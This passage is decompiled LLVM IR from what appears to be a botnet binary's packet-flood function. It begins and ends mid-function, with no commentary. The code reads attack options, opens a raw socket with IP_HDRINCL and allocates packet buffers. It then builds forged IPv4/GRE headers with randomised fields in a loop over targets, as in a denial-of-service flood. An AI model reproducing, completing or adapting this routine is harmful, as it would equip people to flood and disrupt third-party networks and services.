  %v7_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v6_8a04, i32 3, i32 65535, i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v5_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v6_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v5_8a60, i32 6, i32 65535, i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v5_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v6_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v5_8a7c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp89 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp89 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp90, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, 65535
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ 65535, %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
  %v1_8df4 = phi i32 [ %v1_8df4.pre, %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge ], [ %v1_8de8, %dec_label_pc_8de4 ]
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v9_8df4 = icmp eq i32 %v3_8b4c, %v1_8df4
  store i1 %v9_8df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8df4, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8dfc:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  store i32 %v1_8b40, i32* @r4, align 4
